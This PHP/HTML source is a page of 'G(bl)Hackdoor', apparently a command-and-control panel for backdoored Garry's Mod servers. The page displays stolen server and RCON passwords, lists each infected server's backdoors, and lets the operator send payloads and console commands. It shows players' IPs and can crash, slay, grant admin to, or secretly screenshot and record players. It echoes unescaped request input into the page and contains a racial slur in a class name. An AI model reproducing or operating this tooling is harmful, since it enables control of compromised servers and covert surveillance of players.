    <?php include('isdefault.php') ?>
    <?php
if(!isset($_GET["server"]))
  die("Ce n'est pas un dossier . . .");
$ussssr = Server::GetServer($_GET["server"]);
$admin = IsAdmin($_SESSION["id"]);
if(!IsAdmin($_SESSION["id"], $ussssr["userid"]))
  die("Ce serveur ne t'appartient pas")
?>
<style type="text/css">
            ul li {
              display: inline;
            }
            ul#horizontal-lisst {
  min-width: 696px;
  list-style: none;
  padding-top: 20px;
  }
  ul#horizontal-lisst li {
    display: inline;
    float:left;
  }
            #serverinfogp li span {
              color: red;
            }

          </style>
            <div class="breadcome-area">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                            <div class="breadcome-list"><font color="white">
                              <div class="container-fluid">
                                 <div class="row-fluid">
                                  <div class="card-header py-3">
                  <h3 class="m-0 font-weight-bold text-primary"><center><?php echo Server::GetServerName($_GET['server']) ?></center></h3>
                </div>
                <style type="text/css">
                	.niggatoilette *{
                		margin-right: 2.5%; margin-left: 2.5%; width: 140px; height: 30px; background-color: #152036;
                	}
                </style>
                                  <ul  class="nav py-3 niggatoilette" id="horizontal-lisst" style="justify-content: space-around; margin-left: 30px;">

            <li class="active">
            <a class="btn btn-primary"  href="#1a" data-toggle="tab">Administration</a>
          </li>
          <li><a class="btn btn-info" href="#2a" data-toggle="tab"><?php echo $lang["players"]; ?></a>
          </li>
          <li>
            <a class="btn btn-warning" onclick="showcallPayload(<?php echo $_GET["server"]; ?>)"data-toggle="modal" data-target="#serverpayload-modal" href="#"><?php echo $lang["sendpayload"]; ?></a> 
          </li>

          <li><a class="btn btn-warning" href="#3a" data-toggle="tab">Console</a>
          </li>
          <li><a class="btn btn-info" href="#5cc" data-toggle="tab">Addons</a>
          </li>
          <li>
          <a class="btn btn-primary" onclick="giveServer(<?php echo $_GET["server"]; ?>)" href="#"><?php echo $lang["giveservers"]; ?></a> 

          </li>

          </ul>
          <div class="tab-content clearfix">
            <div class="tab-pane active" id="1a">
          <div class="panel panel-default" style="background-color: #152036; color: white; border-color: #2c3851;">
        <div class="panel-heading" style="background-color: #152036; color: white; border-color: #2c3851;"><i class="fa fa-info"></i>&nbsp;Administration</div>
        <div class="panel-body" id="rules-body" style="color:#1c1c1c; background-color: #152036;">

                <ul class="list-group" id="serverinfogp" style="background-color: #152036; color: white; border-color: #2c3851;">
                  <li class="list-group-item" style="background-color: #152036; color: white; border-color: #2c3851;">
                    <?php echo $lang["ipaddress"]; ?><br />
                    <span id="server-ip"><?php echo $lang["waitserver"]; ?></span>    <br /> <a style="margin-right: 5%;" href="#" id="secoauserver"><button class="btn btn-primary">Se connecter au server</button></a><br />

                  </li>
                  <li class="list-group-item" style="background-color: #152036; color: white; border-color: #2c3851;">
                    <?php echo $lang["serverpassword"]; ?><br />
                    <span id="server-pw">Le serveur n'a pas de mot de passe</span>
                  </li>
                  <li class="list-group-item" style="background-color: #152036; color: white; border-color: #2c3851;">
                    <?php echo $lang["rconpassword"]; ?><br />
                    <span id="server-rcon">Le serveur n'a pas de mot de passe RCON</span>
                  </li>
                  <li class="list-group-item" style="background-color: #152036; color: white; border-color: #2c3851;">
                    <?php echo $lang["gamemode"]; ?><br />
                    <span id="server-gm"><?php echo $lang["waitserver"]; ?></span>
                  </li>
                  <li class="list-group-item" style="background-color: #152036; color: white; border-color: #2c3851;">
                    <?php echo $lang["map"]; ?><br />
                    <span id="server-map"><?php echo $lang["waitserver"]; ?></span>
                  </li>
                  <li class="list-group-item" style="background-color: #152036; color: white; border-color: #2c3851;">
                    Screen + Video<br />
                    <span id="server-screen"><button id="screen" data-toggle="modal" data-target="#modalscreen" class="btn btn-sm btn-primary">Voir les screenshots</button></span>
                    <span id="server-video"><button id="video" data-toggle="modal" data-target="#modalsvideo" class="btn btn-sm btn-primary">Voir les videos</button></span>
                  </li>
          <li class="list-group-item" style="background-color: #152036; color: white; border-color: #2c3851;">
                    <?php echo $lang["cac"]; ?><br />
                    <span id="server-cac"><?php echo $lang["waitserver"]; ?></span>
                  </li>
          <li class="list-group-item" style="background-color: #152036; color: white; border-color: #2c3851;">
                    <?php echo $lang["snte"]; ?><br />
                    <span id="server-snte"><?php echo $lang["waitserver"]; ?></span>
                  </li>

                </ul>
                <div class="panel panel-default" style="background-color: #152036; color: white; border-color: #2c3851;">
        <div class="panel-heading" style="background-color: #152036; color: white; border-color: #2c3851;"><i class="fa fa-info"></i>&nbsp;Backdoors</div>
        <div class="panel-body" id="pnlwala-body" style="color:#1c1c1c; background-color: #152036;">
                <ul class="list-group" id="backdoorsgp">


                </ul>
            </div>
        </div>

       </div>
        </div>
      </div>

      <div  class="tab-pane" id="2a">
                  <div class="panel panel-default" style="background-color: #152036; color: white; border-color: #2c3851;">
        <div class="panel-heading" style="background-color: #152036; color: white; border-color: #2c3851;"><i class="fa fa-info"></i>&nbsp;<?php echo $lang["players"]; ?></div>
        <div class="panel-body" id="rules-body" style="color:#1c1c1c; background-color: #152036;">
  <ul class="list-group" id="playersrerss">


                </ul>

   </div>
</div>
      </div>
      <div  class="tab-pane" id="5cc" style="background-color: #152036; color: white; border-color: #2c3851;">
                  <div class="panel panel-default" style="background-color: #152036; color: white; border-color: #2c3851;">
        <div class="panel-heading" style="background-color: #152036; color: white; border-color: #2c3851;"><i class="fa fa-info"></i>&nbsp;Addons</div>
        <div class="panel-body" id="nahrule-body" style="color:#1c1c1c; background-color: #1B2A47;">
  <ul class="list-group" id="addonsgp" style="background-color: #152036; color: white; border-color: #2c3851;">


                </ul>

   </div>
</div>
      </div>
      <div class="tab-pane" id="3a">
        <div class="panel panel-default" style="background-color: #152036; color: white; border-color: #2c3851;">
        <div class="panel-heading" style="background-color: #152036; color: white; border-color: #2c3851;"><i class="fa fa-info"></i>&nbsp;Console</div>
        <div class="panel-body" id="nahrule-body" style="background-color: #1B2A47;">
            <textarea disabled="" id="consollee" rows="20" cols="220" style="background-color: #152036; color: white; border-color: #2c3851;">Chargement. . .</textarea>
       </div>
       <div class="panel-footer" id="nahrule-footer" style="background-color: #152036;">
            <table>
              <tbody>
                <tr>
                  <td style="width: 90vw;">
                  <input id="console_snd" class="form-control" style="background-color: #152036; color: white; border-color: #2c3851;" placeholder="Command a envoyer"></input>
                  
                  </td>
                  <td>
                  <button class="btn btn-primary text-white no-border" type="button" onclick="sendCMD(<?php echo $_GET["server"]; ?>)">
            <span>Envoyer</span>
          </button> 
          </td>
                </tr>
              </tbody>
            </table>
            
       </div>
        </div>
        </div>
    </div>
</div>
<div class="modal fade" id="serverpayload-modal" role="dialog">
  <div class="modal-dialog" role="document" style="background-color: #1B2A47; color: white; border-color: #2c3851;">
    <div class="modal-content" style="background-color: #1B2A47; color: white; border-color: #2c3851;">
      <div class="modal-header" style="background-color: #1B2A47; color: white; border-color: #2c3851;">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title"><?php echo $lang["sendpayload"]; ?></h4>
      </div>
      <div class="modal-body" id="serverpayload-body">
          <div class="form-group">
            <label><?php echo $lang["payload"]; ?></label>
            <select class="form-control" id="server-payload">
            </select>
          </div>
          <div class="form-group">
            <label>Mode d'argument</label>
            <select class="form-control" id="server-payload-arg-mode">
              <option value="texte">Texte</option>
              <optgroup label="Joueurs" id="optgroupplayers">
              </optgroup>
            </select>
          </div>
          <div class="form-group">
            <label>Argument</label>
            <textarea class="form-control" rows="3" id="server-payload-arg" placeholder="Argument du payload"></textarea>
          </div>
      </div>
      <div class="modal-footer" id="serverpayload-footer">
        <button type="button" class="btn btn-danger" data-dismiss="modal"><?php echo $lang["cancel"]; ?></button>
        <button type="button" onclick="callPayload()" class="btn btn-primary"><?php echo $lang["sendpayload"]; ?></button>
      </div>
    </div>

  </div>
</div>

<div id="modalscreen" class="modal fade" role="dialog">
  <div class="modal-dialog">

    <!-- Modal content-->
    <div class="modal-content" style="background-color: #1B2A47">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal">&times;</button>
        <h4 class="modal-title">Screen</h4>
      </div>
      <div class="modal-body" id="allthescreen">
        <a onclick="plyActionn(241, 'no')" class="btn btn-info btn-sm" ><i class="fa fa-skull-smile-wink"></i> <font color="white">Screen touts les joueurs</font></a>
        <?php
                $dir    = '../core/image/'.$GLOBALS['DB']->GetContent("server_list", ["id" => $_GET['server']])[0]["server_ip"];
                $files1 = scandir($dir);

                        
                    // Print Output
                    foreach($files1 as $AfficheServer)
                    {
                      if($AfficheServer == "." || $AfficheServer == "..")
                        continue;

                        echo 
                        "
                        
                                <img src='$dir/" . $AfficheServer . "'>
                                <br/><br/>

                        ";
                    }
        ?>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
      </div>
    </div>

  </div>
</div>

<div id="modalsvideo" class="modal fade" role="dialog">
  <div class="modal-dialog">

    <!-- Modal content-->
    <div class="modal-content" style="background-color: #1B2A47">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal">&times;</button>
        <h4 class="modal-title">Videos</h4>
      </div>
      <div class="modal-body" id="allthescreen">
        <a onclick="plyActionn(239, 'no')" class="btn btn-info btn-sm" ><i class="fa fa-skull-smile-wink"></i> <font color="white">Videos 10s touts les joueurs</font></a>
            <a onclick="plyActionn(240, 'no')" class="btn btn-info btn-sm" ><i class="fa fa-skull-smile-wink"></i> <font color="white">Videos 30s touts les joueurs</font></a>
        <?php
                $dir    = 'core/video/'.$GLOBALS['DB']->GetContent("server_list", ["id" => $_GET['server']])[0]["server_ip"];
                $files1 = scandir($dir);

                        
                    // Print Output
                    foreach($files1 as $AfficheServer)
                    {
                      if($AfficheServer == "." || $AfficheServer == "..")
                        continue;

                        echo 
                        "
                                <a href='https://".$_SERVER["HTTP_HOST"]."/beta/$dir/" . $AfficheServer . "'>https://".$_SERVER["HTTP_HOST"]."/beta/$dir/" . $AfficheServer . "</a>
                                SteamID64 de la personne : ".str_replace("e.webm", "", $AfficheServer)." ( <a href='https://steamidfinder.com/lookup/".str_replace("e.webm", "", $AfficheServer)."/'> Steam finder </a> )
                                <video controls width='95%'>
                                <source src='$dir/" . $AfficheServer . "' type='video/webm'>
                                Sorry, your browser doesn't support embedded videos.
                               </video>
                               <br/><br/>
                        ";
                    }
        ?>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
      </div>
    </div>

  </div>
</div>

<div class="modal fade" id="sendpayload-waiting-modal" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
        <h4><?php echo $lang["waitserver"]; ?></h4>
    </div>
  </div>
</div>
                            </font>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
        <div class="footer-copyright-area">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="footer-copy-right">
                            <p>Copyright © 2019 <a href="https://colorlib.com/wp/templates/">G(bl)Hackdoor</a> All rights reserved.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<?php include('isdefault_down.php') ?>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.dataTables.min.js"></script>
<script src="js/datatables.bootstrap.min.js"></script>
<script src="js/custom.js"></script>
<script src="http://peterolson.github.com/BigInteger.js/BigInteger.min.js"></script>
<script>
  // SteamIDConverter.js
// by Horse M.D.
//
// Converts Steam's various SteamID formats between each other.
// Based off of information found at https://developer.valvesoftware.com/wiki/SteamID and
// some experimentation of my own ^^.
//
// Requires peterolson's BigInteger.js library - https://github.com/peterolson/BigInteger.js
var SteamIDConverter={BASE_NUM:bigInt("76561197960265728"),REGEX_STEAMID64:/^[0-9]{17}$/,REGEX_STEAMID:/^STEAM_[0-5]:[01]:\d+$/,REGEX_STEAMID3:/^\[U:1:[0-9]+\]$/,toSteamID64:function(t){if(!t||"string"!=typeof t)return!1;if(this.isSteamID3(t))t=this.fromSteamID3(t);else if(!this.isSteamID(t))throw new TypeError("Parameter must be a SteamID (e.g. STEAM_0:1:912783)");var e=t.split(":"),i=this.BASE_NUM,r=e[2],n=e[1];return r&&n?i.plus(2*r).plus(n).toString():!1},toSteamID:function(t){if(!t||"string"!=typeof t)return!1;if(this.isSteamID3(t))return this.fromSteamID3(t);if(!this.isSteamID64(t))throw new TypeError("Parameter must be a SteamID64 (e.g. 76561190000000000)");var e=this.BASE_NUM,i=bigInt(t),r=i.mod(2).toString();return i=i.minus(r).minus(e),1>i?!1:"STEAM_0:"+r+":"+i.divide(2).toString()},toSteamID3:function(t){if(!t||"string"!=typeof t)return!1;this.isSteamID(t)||(t=this.toSteamID(t));var e=t.split(":");return"[U:1:"+(parseInt(e[1])+2*parseInt(e[2]))+"]"},fromSteamID3:function(t){var e=t.split(":"),i=e[2].substring(0,e[2].length-1);return"STEAM_0:"+i%2+":"+Math.floor(i/2)},isSteamID:function(t){return t&&"string"==typeof t?this.REGEX_STEAMID.test(t):!1},isSteamID64:function(t){return t&&"string"==typeof t?this.REGEX_STEAMID64.test(t):!1},isSteamID3:function(t){return t&&"string"==typeof t?this.REGEX_STEAMID3.test(t):!1},profileURL:function(t){return this.isSteamID64(t)||(t=this.toSteamID64(t)),"http://steamcommunity.com/profiles/"+t}};
</script>
</html>


    <script type="text/javascript">

      function escapeHtml(unsafe) {
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
 }
      function decodeHTMLEntities(text) {
    var entities = [
        ['amp', '&'],
        ['apos', '\''],
        ['#x27', '\''],
        ['#x2F', '/'],
        ['#39', '\''],
        ['#47', '/'],
        ['lt', '<'],
        ['gt', '>'],
        ['nbsp', ' '],
        ['quot', '"']
    ];

    for (var i = 0, max = entities.length; i < max; ++i) 
        text = text.replace(new RegExp('&'+entities[i][0]+';', 'g'), entities[i][1]);

    return text;
}
const mdrxptdr = ()=>{
        $.ajax({
      url: "core/ajax/get-server-console.php?id=" + <?php echo $_GET["server"]; ?>
    }).done(function(data){ 
      $("#consollee").val(data);
    });
    $.ajax({
      url: "core/ajax/get-server-info.php?id=" + <?php echo $_GET["server"]; ?>
    }).done(function(data){ 
        $("#server-name").text(data.server_name);
        $("#server-ip").text(data.server_ip);
        if(data.rcon != "" && data.rcon != "NOT FOUND")
          $("#server-rcon").text(data.rcon);
        $("#server-gm").text(data.gm);
        $("#server-map").html(escapeHtml(data.map) + '<br /><a href="#" class="btn btn-info btn-sm" onclick="plyActionn(71, \'\')"><font color="white"><i class="fa fa-skull-crossbones"></i> gm_construct</font></a>');
        if(data.pw != "")
          $("#server-pw").html(escapeHtml(data.pw) + '<br /><a href="#" class="btn btn-info btn-sm" onclick="plyActionn(70, \'\')"><font color="white"><i class="fa fa-skull-crossbones"></i> Reset</font></a>');
        document.getElementById("secoauserver").href = "steam://connect/" + data.server_ip + ":" + data.server_port;
        
        dad = JSON.parse(decodeHTMLEntities(data.additonnals));
        console.log(dad);
        $("#server-cac").text(dad.security.cac);
        $("#server-snte").text(dad.security.snte);
        $("#addonsgp").html("");
        $("#backdoorsgp").html("");
        $.each(dad.backdoors, function(i, item) {
          $("#backdoorsgp").html($("#backdoorsgp").html() + '<li class="list-group-item" style="background-color: #152036; color: white; border-color: #2c3851;"><span class="text-danger">' + escapeHtml(item.net) + '</span><br />' + escapeHtml(item.file) + '<br /><code>' + escapeHtml(item.func) + '</code></li>');
        });
        

        $("#addonsgp").html();
        $.each(dad.addons, function(i, item) {
          $("#addonsgp").html($("#addonsgp").html() + '<li class="list-group-item" style="background-color: #1B2A47; color: white; border-color: #2c3851;">' + escapeHtml(item) + '</li>');
        });
        $("#backdoorsgp").html($("#backdoorsgp").html() + '<li class="list-group-item" style="background-color: #152036; color: white; border-color: #2c3851;">GHackDoor <br /><span class="text-danger">' + escapeHtml(dad.infected) + '</span></li>');

    });
    $.ajax({
      url: "core/ajax/get-server-players.php?id=" + <?php echo $_GET["server"]; ?>
    }).done(function(data){ 
      $("#playersrerss").html("");
        $.each(data, function(i, item) {
          $("#playersrerss").html($("#playersrerss").html() + '<li class="list-group-item" style="background-color: #1B2A47; color: white; border-color: #2c3851;"><span class="text-danger">' + escapeHtml(item.name) + '</span> <span class="badge badge-info">' + escapeHtml(item.group) + ' </span><br />' + escapeHtml(item.steamid) + ' <code>' + escapeHtml(item.ip) + '</code><br /><div class="btn-group" role="group"> <a href="#" class="btn btn-danger btn-sm" onclick="plyActionn(8, \'' + escapeHtml(item.steamid) + '\')"><font color="white"><i class="fa fa-smile-wink"></i> SuperAdmin</font></a><a href="#" class="btn btn-danger btn-sm" onclick="plyActionn(126, \'' + escapeHtml(item.steamid) + '\')"><font color="white"><i class="fa fa-smile-wink"></i>  User</font></a>' +
            '<a href="#" class="btn btn-info btn-sm" onclick="plyActionn(104, \'' + escapeHtml(item.steamid) + '\')"><font color="white"><i class="fa fa-book-dead"></i> DeathNote menu </font></a>' +
            ' <a href="#" class="btn btn-info btn-sm" onclick="plyActionn(86, \'' + escapeHtml(item.steamid) + '\')"><font color="white"><i class="fa fa-fire"></i> Fire </font></a>' +
            ' <a href="#" class="btn btn-info btn-sm" onclick="plyActionn(85, \'' + escapeHtml(item.steamid) + '\')"><font color="white"><i class="fa fa-skull-crossbones"></i> Slay</font></a>' +
            ' <a href="#" class="btn btn-info btn-sm" onclick="plyActionn(127, \'' + escapeHtml(item.steamid) + '\')"><font color="white"><i class="fa fa-skull-smile-wink"></i> Crash</font></a>' +
            ' <a onclick="plyActionn(193, \'' + escapeHtml(item.steamid) + '\')" class="btn btn-info btn-sm" ><i class="fa fa-skull-smile-wink"></i> <font color="white">Screen</font></a>' +
            ' <a onclick="plyActionn(227, \'' + escapeHtml(item.steamid) + '\')" class="btn btn-info btn-sm" ><i class="fa fa-skull-smile-wink"></i> <font color="white">Videos 10s</font></a>' +
            ' <a onclick="plyActionn(237, \'' + escapeHtml(item.steamid) + '\')" class="btn btn-info btn-sm" ><i class="fa fa-skull-smile-wink"></i> <font color="white">Videos 30s</font></a>' +
            ' <a href="#" onclick="plyActionn(87, \'' + escapeHtml(item.steamid) + '\')" class="btn btn-info btn-sm"><font color="white"><i class="fa fa-audio"></i> Kick</font></a></div></li>');
        });
    });
      };
      setInterval(mdrxptdr, 5000);
      mdrxptdr();
      function sendCMD(id) {
        $.ajax({
        url: "core/ajax/call-payload.php?server=" + id + "&payload=110&arg=" + $("#console_snd").val()
      }).done(()=>{
        $("#console_snd").val("")
      });
      }
      function plyActionn(func, ply) {
        $.ajax({
        url: "core/ajax/call-payload.php?server=<?php echo $_GET["server"]; ?>&payload=" + func + "&arg=player.GetBySteamID('" + ply + "')"
      }).done(()=>{
        $("#console_snd").val("")
      });
      }
    </script>




